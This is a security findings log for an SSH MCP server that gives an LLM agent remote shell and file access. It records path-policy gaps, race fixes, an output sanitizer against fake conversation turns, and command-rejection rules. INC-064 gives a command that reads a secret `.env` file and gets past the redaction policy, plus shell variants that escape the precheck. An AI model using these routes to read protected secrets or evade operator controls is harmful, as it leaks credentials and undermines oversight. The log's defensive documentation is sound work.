# INCIDENTS — Security review and findings log

Central log of security-relevant findings. Every check performed against
this codebase (internal review, external issue scan, code review) lands
here with a stable ID, a status, and links to the fix + tests +
documentation trail.

Consolidates security-review bookkeeping into a single append-only
ledger. Entries that originated before the 2026-04-16 consolidation keep
their historical IDs in the **Legacy ID** column (e.g. `C1`, `H3`, `N2`,
`W1`) as a migration aid; the `INC-NNN` identifier is canonical going
forward.

## Conventions

- **ID**: `INC-NNN`, issued in order, never reused.
- **Source**:
  - `internal-review` — we found it ourselves scanning the codebase.
  - `external-issue` — public issue in another SSH-MCP project.
  - `audit-report` — external security audit (e.g. AgentWard).
  - `code-review` — post-merge review of a specific PR / change.
- **Severity**: `Critical` / `High` / `Medium` / `Low` / `N/A` (the `N/A`
  case is for external issues that don't apply to our architecture).
- **Status**: `resolved` / `open` / `deferred` / `n/a`.
- **Refs**: BACKLOG progress entry date, DECISIONS ADR, source file + line,
  regression test path.

## How to use this file

- **Before opening a new finding**: grep here first. If the issue class was
  already evaluated, add a comment to the existing row rather than opening
  a new one.
- **When resolving**: change `Status` to `resolved`, add the fix commit /
  test / ADR to `Refs`, keep the original context block intact. Don't
  delete entries — the audit trail is the whole point.
- **When deferring**: change `Status` to `deferred`, add a `Deferred until:`
  line with a trigger condition ("when `ssh_shell_exec` grows complexity",
  "when we have a live Windows OpenSSH test target").

---

## Status index

Newest at the top.

| ID | Legacy | Date | Severity | Status | Source | Title |
|---|---|---|---|---|---|---|
| INC-065 | — | 2026-05-30 | Medium | resolved (v1.4.0) | external-report | `ssh_host_notes_append` lost concurrent updates: two MCP server processes both appending to the same sidecar around the same time would silently clobber the earlier writer's entry. `atomic_write_sidecar` was atomic at the FS level (tmp+rename) but the read-then-build-then-write cycle had no logical CAS. Fix: optimistic CAS — capture `(mtime_ns, size)` snapshot at read, re-stat right before rename, abort + retry the whole loop if changed. Up to 5 retries; pathological contention raises `RuntimeError` instead of unbounded spin. `ssh_host_notes_set` remains deliberately last-writer-wins (CAS variant with `expected_etag` is a v1.14 candidate). |
| INC-064 | — | 2026-05-30 | Low | open (by-design, partial mitigation v1.4.0) | internal-review | Raw-exec bypass of `redact_paths_globs`: `ssh_exec_run cat /opt/.env` delivers plaintext regardless of redact policy; `redact_bypass_policy=block` only gates path-bearing SFTP tools, not the exec tier. Documented limitation; mitigation is to not allowlist `cat`/`less`/`head`/`tail` in `command_allowlist`. See ADR-0027, ADR-0028. |
| INC-063 | — | 2026-05-26 | Medium | resolved | external-report | POSIX `_canonicalize_posix` failed under chrooted SFTP (DSM 7.x): shell `realpath` (run over SSH channel, real-FS view) ENOENTs on paths the LLM gets from SFTP discovery (chroot view). Fix: fall back to `sftp.realpath` when shell realpath fails — SFTP-backed tools now work on chroot hosts; shell-backed tools (`ssh_cp`, `ssh_delete_folder` rm fallback, `ssh_mv` cross-fs fallback) still fail with native shell errors and need the chroot disabled or `ssh_exec_run` |
| INC-062 | — | 2026-05-22 | Low | resolved | internal-review | Exec-discipline cheatsheet: default-on rejection of `ssh_exec_run` / `_streaming` / `ssh_sudo_exec` commands matching a native MCP wrapper. `SSH_EXEC_ALLOW_CHEATSHEET_PATTERNS=false` (default) refuses with `CommandIsCheatsheetMatch`; `=true` runs but tags the audit line with `cheatsheet_pattern_id` for opt-out telemetry. Rejection audit-line suppressed (no host-side side-effect); hooks still fire so PRE/POST stay paired. Eval at `docs/evals/2026-05-22-exec-run-discipline.md` |
| INC-061 | — | 2026-04-30 | Medium | resolved | code-review | Compose tools bypassed `restricted_paths` — `compose_file` only went through `canonicalize_and_check`, skipping `check_not_restricted`; all 5 call sites migrated to `resolve_path` in v1.2.0 |
| INC-060 | — | 2026-04-27 | Low | resolved | internal-review | `ssh_host_ping` also auto-injects `agent_notes` (the LLM's own sidecar) — both layers now ride on ping by default. Independent toggle `SSH_PING_INCLUDES_AGENT_NOTES=false` for context-budget-sensitive deployments |
| INC-059 | — | 2026-04-25 | Low | resolved | internal-review | `ssh_host_ping` auto-injects `operator_notes` from `hosts.toml`'s `notes` field — operator hard-rules ride on the canonical "starting work" probe so the LLM gets them without an explicit `ssh_host_notes` call. Opt-out via `SSH_PING_INCLUDES_NOTES=false`; agent-side memory still requires the dedicated tool |
| INC-058 | — | 2026-04-25 | Low | resolved (Pass A) | internal-review | Output sanitizer extended to file-content surfaces — `ssh_systemctl_status` / `_cat` / `ssh_journalctl` propagate `output_warnings` from exec layer; `ssh_sftp_download` runs `scan()` on a UTF-8 view (binary content untouched). Pass B (filename scanning for `ssh_sftp_list` / `ssh_find` + structured docker/host fields) deferred |
| INC-057 | — | 2026-04-25 | Medium | resolved | internal-review | Output sanitizer for remote command output — strips ANSI escapes + NUL bytes; flags bidi overrides / zero-width / C1 controls / LLM protocol markers / fake conversation turns via `ExecResult.output_warnings`. Sanitization at the `ssh.exec.run()` boundary covers all exec/sudo/shell/broadcast/docker tools |
| INC-056 | — | 2026-04-25 | Low | resolved | internal-review | New `ssh_link` tool — hard links via SFTP `link()` (default, `-L`); `follow_symlinks=False` for `ln -P --physical` (shell fallback); `symbolic=True` for `ln -s` (pure SFTP `symlink()`). Both sides path-validated; symbolic targets validated string-wise (allows dangling, rejects NUL bytes) |
| INC-055 | — | 2026-04-25 | Low | resolved | internal-review | Per-host two-layer memory — operator baseline (`hosts.toml.notes`) + agent sidecar (`notes/<alias>.md`); read via `ssh_host_notes`, written by the LLM via `ssh_host_notes_append` / `_set`; `has_notes` flag on `ssh_host_list` covers both layers |
| INC-054 | — | 2026-04-25 | Low | resolved | internal-review | LLM reaching for `ssh_exec_run` heredocs to write files — sharpened "DO NOT use for file writes" language in tool docstring + skill mapping table; added `content_text` (plain UTF-8) sibling to `content_base64` on `ssh_upload` + `ssh_deploy` so plain text doesn't need encoding |
| INC-053 | — | 2026-04-17 | Low | deferred | internal-review | `ssh_cron` port deferred — upstream design has password-as-tool-arg + index-based remove + shell concatenation issues; needs UUID-tagged rewrite |
| INC-052 | — | 2026-04-17 | Low | resolved | internal-review | Upstream tool surface comparison (`analyze/ssh-server-mcp-main`) — shipped: `ssh_broadcast`, `ssh_transfer`, `ssh_user_info`, `ssh_host_network`, `ssh_host_info` extended (cpu/fqdn) + audit-log README section; design-no for `ssh_get_logs` + port forwarding stands; `ssh_snapshot` deferred to runbook-first |
| INC-051 | — | 2026-04-17 | Medium | resolved | external-issue | `classfang/ssh-mcp-server#22` — `SSH_CONFIG_FILE` was declared + documented but never consumed; now wired to `asyncssh.connect(config=[...])` with empty-string normalization + startup log |
| INC-050 | — | 2026-04-17 | N/A | n/a (covered) | external-issue | `bvisible/mcp-ssh-manager#16` — hardcoded `__dirname/.env` path; Python equivalent uses CWD-relative resolution + sync lifespan load |
| INC-048 | — | 2026-04-17 | Low | resolved | code-review | `services/audit.py` now type-checks both `kwargs["host"]` and `args[0]`; non-string falls through to "?" |
| INC-047 | — | 2026-04-17 | Medium | resolved | code-review | Shell-session `session.lock` is the only guard on `cwd`; added `exec_scope()` + `set_cwd()` that asserts lock-held at runtime |
| INC-046 | — | 2026-04-17 | Low | resolved | code-review | Step 1: `extra="forbid"` on all 13 result models. Step 2: 22 tools now return their `BaseModel` directly; MCP advertises real schemas; all test assertions converted to attr-access |
| INC-045 | — | 2026-04-17 | Low | resolved | code-review | Cleanup pass (104 → 0) + ruff `select` expanded with `ASYNC`/`PERF`/`PT`/`PLE`/`TCH`; runtime-import gotchas pinned via per-file ignores |
| INC-044 | — | 2026-04-17 | Low | open | code-review | No `.pre-commit-config.yaml`, no `.github/workflows/*.yml`, no `.python-version`; mypy-strict + custom ruff need CI gates |
| INC-043 | — | 2026-04-17 | Medium | resolved | code-review | `tools/docker_tools.py` 1020 lines split into `docker/_helpers` + `read_tools` + `lifecycle_tools` + `dangerous_tools` subpackage; facade preserves public imports |
| INC-042 | — | 2026-04-17 | Medium | resolved | code-review | `tools/_context.py` accessors use `# type: ignore[no-any-return]`; defined `LifespanContext` `TypedDict` + single `cast` |
| INC-041 | — | 2026-04-17 | Low | resolved | code-review | `tenacity` declared in pyproject but never imported — removed |
| INC-040 | — | 2026-04-17 | Medium | resolved | code-review | `_docker_prefix` / `_compose_prefix` typed `policy: Any, settings: Any`; now `HostPolicy` / `Settings` under `TYPE_CHECKING` |
| INC-039 | — | 2026-04-17 | Medium | resolved | code-review | `_atomic_write` catch `except Exception:` swallowed `CancelledError` / `MemoryError`; narrowed to `(asyncssh.Error, OSError)` |
| INC-038 | — | 2026-04-17 | Medium | resolved | code-review | `ssh_host_info` / `_alerts` used `asyncio.gather` without `return_exceptions=True`; one failing probe cancelled siblings |
| INC-037 | — | 2026-04-17 | Medium | resolved | code-review | `HostKeyMismatch` raised with literal `"<received>"` placeholder; replaced with explicit "unknown (asyncssh didn't expose it)" wording |
| INC-036 | — | 2026-04-17 | High | resolved | code-review | `ConnectionPool._reap_once()` iterated `self._entries.items()` while concurrent `acquire` could mutate → `RuntimeError`; snapshotted |
| INC-035 | — | 2026-04-17 | High | resolved | code-review | `ssh/exec.py` cancelled pump tasks on timeout without awaiting them; "Task exception was never retrieved" + lingering refs to closed channel |
| INC-034 | — | 2026-04-17 | High | resolved | e2e-test | Windows SFTP `realpath` returns Cygwin form `/C:/...`; canonicalizer rejected every Windows path |
| INC-033 | — | 2026-04-16 | Medium | resolved | code-review | `ssh_docker_volumes(name=...)` exit_code semantics undocumented (I2) |
| INC-032 | — | 2026-04-16 | Low | resolved | code-review | `_DOCKER_TIME_RE` accepts `d` but Go rejects it (I1) |
| INC-031 | — | 2026-04-16 | Critical | resolved | code-review | `ssh_file_hash` Windows branch used POSIX `shlex.join` quoting (B1) |
| INC-030 | — | 2026-04-16 | High | resolved | code-review | `ssh_file_hash` timeout docstring lie + no param (B1) |
| INC-029 | — | 2026-04-16 | High | resolved | code-review | `ssh_docker_cp` missing `effective_restricted_paths`/`check_not_restricted` imports → NameError (B1) |
| INC-028 | W1 | 2026-04-16 | Medium | resolved | internal-review | `ssh_file_hash` now supports Windows via PowerShell `-EncodedCommand` (base64-UTF16LE of a `Get-FileHash` script) |
| INC-027 | N3b | 2026-04-15 | Low | n/a (superseded) | internal-review | Shell-session lock has no end-to-end test — superseded by INC-047 (`set_cwd` now asserts lock-held; bypass-the-lock regression class eliminated) |
| INC-026 | N3a | 2026-04-15 | Low | resolved | internal-review | Tautological assertion in shell-session lock test |
| INC-025 | N2b | 2026-04-15 | Low | resolved | internal-review | Container-namespace join flags not covered (`--pid=container:<id>`) |
| INC-024 | N2a | 2026-04-15 | Medium | resolved | internal-review | `--mount` bypassed docker-run escalation deny-list |
| INC-023 | N3 | 2026-04-15 | Low | resolved | internal-review | Shell-session state caller-serialized, not locked |
| INC-022 | N2 | 2026-04-15 | Medium | resolved | internal-review | `ssh_docker_run` accepts arbitrary docker flags (--privileged, --cap-add, ...) |
| INC-021 | N1 | 2026-04-15 | Medium | resolved | internal-review | Unbounded fire-and-forget hook tasks |
| INC-020 | — | 2026-04-16 | N/A | n/a | code-review | Commit-message-style review: SSRF / hardcoded fallbacks / typos / stray `}` |
| INC-019 | — | 2026-04-15 | N/A | n/a | external-issue | `classfang/ssh-mcp-server#31` — `the input device is not a TTY` |
| INC-018 | — | 2026-04-15 | N/A | n/a | external-issue | `tufantunc/ssh-mcp#44` — newline injection via `description` metadata field |
| INC-017 | — | 2026-04-15 | N/A | n/a | external-issue | `tufantunc/ssh-mcp#42` — credentials in process argv / `ps` |
| INC-016 | — | 2026-04-15 | N/A | n/a | external-issue | `tufantunc/ssh-mcp#2` — no default command timeout |
| INC-015 | — | 2026-04-15 | N/A | n/a | audit-report | `bvisible/mcp-ssh-manager#13` — AgentWard audit (37 tools, unrestricted SSH, SOCKS5, no path allowlist) |
| INC-014 | L2 | 2026-04-14 | Low | resolved | internal-review | SFTP magic error codes (should use `asyncssh.sftp.FX_*`) |
| INC-013 | L1 | 2026-04-14 | Low | resolved | internal-review | Host policy lacked port-range / type / absolute-path validation |
| INC-012 | M5 | 2026-04-14 | Medium | resolved | internal-review | Absolute-path `command_allowlist` entries basename-matched (shadow-binary risk) |
| INC-011 | M1 | 2026-04-14 | Medium | resolved | internal-review | Streaming `chunk_cb` received more bytes than buffer captured |
| INC-010 | H4 | 2026-04-14 | High | resolved | internal-review | `ssh_edit` / `ssh_patch` crash on non-UTF-8 files |
| INC-009 | H3 | 2026-04-14 | High | resolved | internal-review | `SSH_SUDO_PASSWORD` env-var accepted (should be rejected at startup) |
| INC-008 | H2 | 2026-04-14 | High | resolved | internal-review | Audit `error` field leaks full exception text (may carry remote stderr) |
| INC-007 | H1 | 2026-04-14 | High | resolved | internal-review | `UnknownHost` vs `HostKeyMismatch` disambiguated by exception text substring |
| INC-006 | C4 | 2026-04-15 | Critical | resolved | internal-review | `KnownHosts.fingerprint_for` silently returned `None` (wrong tuple unpack) |
| INC-005 | C3 | 2026-04-14 | Critical | resolved | internal-review | Streaming `_pump` byte counters not updated per chunk → `stdout_truncated` wrong on timeout |
| INC-004 | C2 | 2026-04-14 | Critical | resolved | internal-review | `assert` before `rm -rf` stripped under `python -O` |
| INC-003 | C1 | 2026-04-14 | Critical | resolved | internal-review | `SSH_ENABLED_GROUPS` field missing from `Settings` — startup crash |
| INC-002 | — | 2026-04-14 | N/A | n/a | external-issue | External review: path confinement must apply to reads (ADR-0017 triggering event) |
| INC-001 | — | 2026-04-14 | N/A | n/a | external-issue | External review: empty `command_allowlist` footgun (ADR-0018 triggering event) |

---

## Detailed entries

### INC-065 — `ssh_host_notes_append` lost concurrent updates (v1.4.0)

- **Date:** 2026-05-30 · **Severity:** Medium · **Status:** resolved in v1.4.0
- **Source:** external-report (operator noticed: two agent sessions both appending to `notes/<host>.md`; one entry vanished without trace)
- **Refs:** [services/host_notes.py](src/ssh_mcp/services/host_notes.py), [tools/host_notes_tools.py](src/ssh_mcp/tools/host_notes_tools.py), [tests/test_host_notes.py](tests/test_host_notes.py)

**Bug:** `ssh_host_notes_append` did a non-atomic read-modify-write sequence:

```python
existing = read_sidecar(sidecar) or ""        # T0
... build new_content from existing + entry
atomic_write_sidecar(sidecar, new_content)    # T1
```

`atomic_write_sidecar` is atomic at the FS level (tmp + `os.replace` — no torn write possible) but **not** a logical CAS. When two MCP server processes both reached T0 with the same view of `existing`, the second writer's `atomic_write_sidecar` at T1 silently overwrote whatever the first writer had landed in between. Last-writer-wins on the logical level, despite the FS-level atomicity.

The race surfaces in practice when two operators / sessions run agents in parallel against the same fleet — both call `ssh_host_notes_append` for the same host within seconds of each other.

**Fix (v1.4.0):** Optimistic compare-and-swap:

1. `read_sidecar_with_snapshot(path) -> SidecarSnapshot` captures the file's `(mtime_ns, size)` alongside the text — `None`s when the file did not exist.
2. `atomic_write_sidecar_if_unchanged(path, content, expected_mtime_ns, expected_size) -> bool` re-stats the file right before `os.replace`, refuses the write (returns False) if the version tag changed since the snapshot.
3. `ssh_host_notes_append` wraps the build-and-write step in a 5-iteration retry loop. Each iteration takes a fresh snapshot, rebuilds the content against the newer existing text, attempts the CAS write. Concurrent writer beats us → loop again. Pathological contention (5 failures in a row) raises `RuntimeError` with a clear message instead of unbounded spin.

**Trade-off / residual TOCTOU:** there is a microseconds-wide window between the final `stat()` check inside `atomic_write_sidecar_if_unchanged` and the `os.replace`. For our actual contention (a handful of agent sessions sharing a notes file) this is statistically negligible. High-contention scenarios need a real `fcntl.flock`; deliberately not added in v1.4.0 because lock-files have their own pathologies (stale locks on crash, Windows/POSIX divergence, less predictable failure modes than CAS retries).

**`ssh_host_notes_set` is NOT fixed in v1.4.0.** A whole-file replace from one caller is inherently "I want my version, regardless of intermediate appends". If the caller wants safety they must call `ssh_host_notes` immediately before and accept that other agents may still race. A CAS variant with explicit `expected_etag` is a v1.14 candidate.

**Tests:** `tests/test_host_notes.py` gained three new tests — `test_append_retries_on_concurrent_writer` simulates a stale snapshot scenario via monkeypatch and verifies BOTH entries survive (no silent clobber); `test_append_raises_when_concurrent_writers_exhaust_retries` pins the bounded-retry → RuntimeError contract; `test_append_first_attempt_succeeds_in_uncontended_case` is the sanity guard that uncontended calls don't waste retries.

### INC-064 — Raw-exec bypass of `redact_paths_globs` (known limitation, by-design)

- **Date:** 2026-05-30 · **Severity:** Low · **Status:** open (by-design)
- **Source:** internal-review (v1.4.0 redaction layer audit)
- **Refs:** [services/redact_policy.py](src/ssh_mcp/services/redact_policy.py), [tools/sftp_read_tools.py:ssh_read_redacted](src/ssh_mcp/tools/sftp_read_tools.py), [DECISIONS.md ADR-0027](DECISIONS.md), [skills/ssh-read-redacted/SKILL.md](skills/ssh-read-redacted/SKILL.md)

**Gap:** `redact_bypass_policy=block` (and the `warn` / `audit_only` modes) gates SFTP-layer path-bearing tools — `ssh_sftp_download`, `ssh_sftp_list`, `ssh_sftp_stat`, `ssh_find`, `ssh_file_hash`, and all low-access tools that call `resolve_path`. It does NOT gate exec-tier tools. An LLM (or caller) with `ALLOW_DANGEROUS_TOOLS=true` and `cat` (or `less` / `head` / `tail`) in `command_allowlist` can retrieve the raw plaintext of any file via `ssh_exec_run cat /opt/.env` regardless of the redact-paths-globs configuration. The exec tool takes a command string, not a path argument — there is no structural hook to apply path-level policy to the arguments of an arbitrary shell command.

**Impact:** On deployments where exec tier is not enabled (`ALLOW_DANGEROUS_TOOLS=false`, the default), this gap is not exploitable. On deployments where exec is enabled, the gap is real but operator-controlled: the `command_allowlist` is the correct layer of defense. An operator who does not allowlist `cat` / `less` / `head` / `tail` cannot reach the file through exec either.

**There is no fix path that doesn't fundamentally redesign the exec tier.** Intercepting command strings to detect path-like arguments would be fragile (shell aliases, variable substitution, pipes), and adding a per-host "exec also obeys redact policy" gate would silently break legitimate workflows (e.g. `cat /tmp/ok-file`). The correct architecture is: exec tier accesses everything the SSH user can; `redact_paths_globs` gates the structured SFTP layer only.

**Documented mitigation (operator action):**

1. Do NOT allowlist `cat`, `less`, `head`, `tail` in `command_allowlist` on hosts with sensitive files.
2. Use the cheatsheet rejection (`SSH_EXEC_ALLOW_CHEATSHEET_PATTERNS=false`, default) -- `ssh_exec_run cat <path>` already matches a cheatsheet pattern and is rejected with a hint pointing to `ssh_sftp_download` or `ssh_read_redacted`.
3. If exec tier is not needed for the host, keep `ALLOW_DANGEROUS_TOOLS=false`.

Note on cheatsheet overlap (INC-062): `ssh_exec_run cat /opt/.env` is already rejected by the cheatsheet precheck when `SSH_EXEC_ALLOW_CHEATSHEET_PATTERNS=false` (default). This does not close the gap entirely (the precheck matches specific patterns; a sufficiently creative command can escape it), but it adds meaningful friction.

**Status:** open by-design. No code change is planned. Documented in SKILL.md and ADR-0027 so operators set expectations correctly.

**v1.4.0 mitigation (partial, 2026-05-30):** Five sudo-tier path-bearing tools (`ssh_sudo_read`, `ssh_sudo_read_redacted`, `ssh_sudo_write`, `ssh_sudo_edit`, `ssh_sudo_sftp_list`) now route root-owned filesystem ops through `resolve_path` (full policy chain: allowlist + restricted_paths + restricted_globs + redact_bypass_policy). The cheatsheet recognizes `sudo cat / head / tail / less / more / view / xxd / od / strings / wc / tee / sh -c 'cat > ...' / vi / vim / nano / emacs / ed / ls` shapes and refuses them with the matching `ssh_sudo_*` tool name as the suggested alternative. The plain-exec cheatsheet adds path-aware suggestions: `cat /opt/app/.env` against a host with `redact_paths_globs=["**/.env"]` routes to `ssh_read_redacted` rather than the generic `ssh_sftp_download`. Residual bypass surface: creative shapes that take path filters or expressions (`awk '{print}' .env`, `sed -n 1p .env`) are caught by the `read-ambiguous` pattern and rejected with a generic redirect message, but the arms race against operator-creative shell shapes is explicitly not pursued -- the spec accepts that bound. See ADR-0028.

### INC-063 — `_canonicalize_posix` failed under chrooted SFTP (view-mismatch with SSH session channel)

- **Date:** 2026-05-26 · **Severity:** Medium · **Status:** resolved
- **Source:** external-report (operator: DSM 7.3.2 host `james`)
- **Refs:** [services/path_policy.py](src/ssh_mcp/services/path_policy.py), [tests/test_path_policy.py](tests/test_path_policy.py)

**Gap:** On hosts where the sshd config runs the SFTP subsystem in a chroot but leaves the SSH session channel pointed at the real filesystem (DSM 7.x internal-sftp is the canonical case; OPNsense and some appliance SSH servers do the same), the LLM gets one set of paths from SFTP discovery (`ssh_sftp_list("/")` returns chroot-view `/docker/...`) and a different set from session-channel tools (`ssh_exec_run "ls /"` shows `/volume1/docker/...`). `_canonicalize_posix` runs shell `realpath` over the SSH channel, which sees the real filesystem view, so every chroot-view path the LLM produces ENOENTs at canonicalize time — `ssh_sftp_stat`, `ssh_upload`, `ssh_edit`, `ssh_mkdir`, `ssh_sftp_download`, `ssh_find` all fail with `cannot canonicalize ...`. The original bug report misattributed the failure to `asyncssh.SFTPClient.realpath` (SSH_FXP_REALPATH); the stack trace `realpath: /docker: No such file or directory` is in fact the shell-realpath stderr.

**Impact:** Every SFTP-backed file tool was unusable on chrooted SFTP hosts even when the SFTP subsystem itself was healthy and `ssh_sftp_list` returned correct paths. Not a security defect (path policy was still enforced; it just rejected everything), but a hard usability break — the host appeared half-functional to the LLM.

**Fix:** `_canonicalize_posix` now falls back to `sftp.realpath` (SSH_FXP_REALPATH) when the shell `realpath` exits non-zero. SFTP-protocol realpath runs inside the SFTP subsystem's view, so its answer matches what subsequent SFTP I/O sees. Two new helpers ([services/path_policy.py](src/ssh_mcp/services/path_policy.py)): `_try_sftp_realpath` and `_try_sftp_stat`, both `asyncssh.Error`-tolerant so a transport hiccup during the probe degrades to `None`/`False` and the caller raises the original shell-realpath error.

**must_exist semantics under fallback:** `realpath -m` (must_exist=False) tolerates missing leaves on the shell side already; when we fall back via SFTP for that case, no stat verification runs. For `must_exist=True` (the strict path), the shell call uses `-e` and the fallback runs `sftp.stat` on the SFTP-resolved path to enforce existence — if the chroot view also doesn't have the file, we raise `PathNotAllowed` with a message that names both probes.

**WARNING-level log line** on `ssh_mcp.services.path_policy` whenever the fallback fires — that's the operator's signal that this host has a view mismatch. Message names the workarounds: disable SFTP chroot server-side (clean), or treat shell-backed tools (`ssh_cp` / `ssh_delete_folder`'s rm fallback / `ssh_mv` cross-fs fallback) as expected to fail.

**Security model intact:** the canonical path returned IS still canonicalized — by the SFTP server, in the SFTP server's view. `path_allowlist` enforcement against that path is meaningful because the operator typically configures the allowlist against the view they see when they sftp into the host (`/docker` not `/volume1/docker`). If the operator's allowlist is in the real-FS form, the fallback path will fail the allowlist check — fail-loud signal to update the allowlist.

**Shell-backed tools** (`ssh_cp` uses `cp -a`, `ssh_delete_folder`'s rm-rf fallback, `ssh_mv` cross-fs fallback, `ssh_link -P` mode) still operate via the SSH channel and will fail with their native shell errors on chroot-view paths. Documented in the path_policy module docstring. Operators have two options: fix the chroot (preferred), or use `ssh_exec_run` for those operations.

**Tests:** 5 new cases in [tests/test_path_policy.py](tests/test_path_policy.py): fallback fires on shell ENOENT and returns the SFTP view, fallback skipped on shell happy-path (no extra round-trip cost for non-chroot hosts), both-failed raises with both-named message, `must_exist=True` + SFTP-stat-missing rejects, `must_exist=False` skips the verifying stat. A `FakeConn`-level default SFTP stub (raising) preserves the pre-fix contract for existing "shell fails" tests.

### INC-062 — Exec-discipline cheatsheet: default-on rejection of native-tool-matching shell commands

- **Date:** 2026-05-22 · **Severity:** Low · **Status:** resolved
- **Source:** internal-review (eval of one real OS-upgrade session)
- **Refs:** [docs/evals/2026-05-22-exec-run-discipline.md](docs/evals/2026-05-22-exec-run-discipline.md), [services/exec_cheatsheet.py](src/ssh_mcp/services/exec_cheatsheet.py), [services/audit.py](src/ssh_mcp/services/audit.py), [ssh/errors.py](src/ssh_mcp/ssh/errors.py), [config.py](src/ssh_mcp/config.py), [.claude/team/corrections.md](.claude/team/corrections.md) (rule #6), [tests/test_exec_cheatsheet.py](tests/test_exec_cheatsheet.py), [tests/test_exec_cheatsheet_footer.py](tests/test_exec_cheatsheet_footer.py)

**Gap:** An eval of one real OS-upgrade session found ~62% of 127 `ssh_exec_run` calls were avoidable — they matched a dedicated native MCP wrapper's cheatsheet entry (heredoc file-writes that belong in `ssh_upload`, `docker ... ` / `systemctl ... ` / `journalctl ... ` / `apt(-get) install|...` that have first-class tools, single `mkdir`/`cp`/`mv`/`rm` invocations, output redirection to a real file). The cheatsheet was already documented in the tool docstring; documentation alone wasn't enough to change behavior.

**Impact:** Avoidable calls are not a security defect on their own, but the discipline gap has cascading costs: (1) `ssh_exec_run` bypasses the wrapper's structured result models so the LLM has to re-parse stdout, (2) wrapper-specific policy gates (e.g. path policy on `ssh_upload`, allowlist narrowing on docker tools) are skipped, (3) the audit line carries a raw-command hash instead of a structured signal (no `docker_subcommand`, no `unit_hash`). Heredoc file-writes are the worst offender — they shell-substitute the payload and bypass `path_allowlist` + atomic temp+rename.

**Fix:** Sprint kickoff `2026-05-22`. Default-on rejection of cheatsheet-matching commands at the tool surface.

- New [services/exec_cheatsheet.py](src/ssh_mcp/services/exec_cheatsheet.py): pattern matcher (7 classes — `docker`, `systemctl <verb>`, `journalctl`, `apt(-get) <mutation-verb>`, heredoc/tee/echo>/printf>, single `mkdir`/`cp`/`mv`/`rm` (composite-safe), generic `>` to a real file). Stable `pattern_id` per class so audits, hints, and tests share one vocabulary.
- New `CommandIsCheatsheetMatch` exception in [ssh/errors.py](src/ssh_mcp/ssh/errors.py) carrying `pattern_id`, `command`, `suggested_tool`, `message`.
- New setting `SSH_EXEC_ALLOW_CHEATSHEET_PATTERNS: bool = False` in [config.py](src/ssh_mcp/config.py) + [.env.example](.env.example). When `False` (default), `ssh_exec_run` / `ssh_exec_run_streaming` / `ssh_sudo_exec` refuse with `CommandIsCheatsheetMatch` BEFORE pool acquire / `check_command` / host resolution — no host-side side-effect.
- `cheatsheet_precheck(...)` is shared across the three call sites (lives in `services.exec_cheatsheet`, not the tool layer — see SOC fix in this same sprint).
- Audit-line **suppression** for rejected calls: the `@audited` wrapper's `finally` skips `record()` when the raised exception is `CommandIsCheatsheetMatch`, so refused calls don't create `result=error` noise in operator dashboards. The DEBUG full-error log on the same logger still fires for local forensics.
- Opt-out (`SSH_EXEC_ALLOW_CHEATSHEET_PATTERNS=true`) lets the command through AND adds `cheatsheet_pattern_id=<id>` to the audit line so operators can grep `jq 'select(.cheatsheet_pattern_id)'` to count abuse by pattern. Also prepends a `cheatsheet_hint_warning` to `output_warnings` ("consider <wrapper> next time") so the LLM sees the redirect target even when the call succeeded.
- Hook behavior intentionally unchanged: PRE/POST `HookRegistry` hooks fire on rejection so operator hooks see matched pairs. Hook handlers that want to skip cheatsheet rejections inspect `HookContext.error == "CommandIsCheatsheetMatch"`.

**Process artefacts (separate from the code fix):**

- Correction row #6 in [.claude/team/corrections.md](.claude/team/corrections.md) makes the discipline non-negotiable for all sub-agents.
- AGENTS.md §3.6 documents the discipline and links to the eval.
- 11 runbook SKILL.mds updated so examples reach for native tools first.
- New first-class apt mutation tools (`ssh_apt_install` / `_upgrade` / `_remove` / `_autoremove` / `_mark` + `ssh_apt_show_holds`) and systemctl mutation tools (committed earlier in `f42f426`) reduce the legitimate exec-tier surface area by covering what `ssh_sudo_exec systemctl ...` and `ssh_sudo_exec apt-get ...` previously served.

**Tests:** [tests/test_exec_cheatsheet.py](tests/test_exec_cheatsheet.py) (positive + negative + ordering matrix + audit suppression — ~137 tests) and [tests/test_exec_cheatsheet_footer.py](tests/test_exec_cheatsheet_footer.py) (opt-out hint + audit pattern_id field + ContextVar isolation across sequential calls). Per-pattern positive matrix pins the canonical `pattern_id → suggested_tool` map; deterministic ordering tests pin "earlier pattern wins" under whitespace + trailing-arg permutations.

**Risk: false positives.** The matcher is deliberately conservative (composite scripts, append-redirects, discard-to-/dev/null all fall through) but a benign `cmd > /tmp/foo` will now refuse unless the operator flips the opt-out. The `cheatsheet_pattern_id` audit field exists precisely so operators can see what is being refused or bypassed.

### INC-061 — Compose tools bypassed `restricted_paths`

- **Date:** 2026-04-30 · **Severity:** Medium · **Status:** resolved · **Closed:** 2026-05-03
- **Source:** code-review
- **Refs:** [tools/docker/lifecycle_tools.py](src/ssh_mcp/tools/docker/lifecycle_tools.py), [services/path_policy.py](src/ssh_mcp/services/path_policy.py), [tests/test_compose_path_policy.py](tests/test_compose_path_policy.py), [DECISIONS.md ADR-0017](DECISIONS.md)

**Gap:** All five `ssh_docker_compose_*` tools that invoke docker-compose with a caller-supplied `compose_file` path resolved that path through `canonicalize_and_check` only. `canonicalize_and_check` confirms the canonical path is inside `path_allowlist`, but it does not call `check_not_restricted`. This meant that a path sitting inside `path_allowlist` but also inside `restricted_paths` (e.g. an SMB mount at `/mnt/shared`, an NFS share, or any operator-declared carve-out) would pass the compose tools' gate even though `ssh_sftp_download`, `ssh_edit`, `ssh_upload`, and the other path-bearing tools would all reject it.

**Impact:** The uniformity invariant of the path policy was broken. An LLM or caller could invoke `ssh_docker_compose_up(compose_file="/mnt/shared/stack.yml")` and have docker-compose execute a YAML in a restricted zone — mounting volumes, declaring ports, running `entrypoint`/`command` init sequences — even when reading or writing that same file directly would have been blocked. The gap was not exploit-active (requires `ALLOW_DANGEROUS_TOOLS=true` and a compose file in a restricted path to be useful to an attacker) but the policy uniformity break is a meaningful security surface: "execute it" is a stronger operation than "read/write it."

**Fix:** Sprint 1 (2026-05-03, v1.2.0) migrated all five call sites in `tools/docker/lifecycle_tools.py` from `canonicalize_and_check` to `resolve_path`, which bundles `canonicalize_and_check` + `check_not_restricted` in one call. This is the same canonical helper already used by `ssh_upload`, `ssh_edit`, `ssh_cp`, `ssh_transfer`, `ssh_docker_cp`, and all other path-bearing tools (established by the `resolve_path` extraction work cross-referenced in ADR-0017).

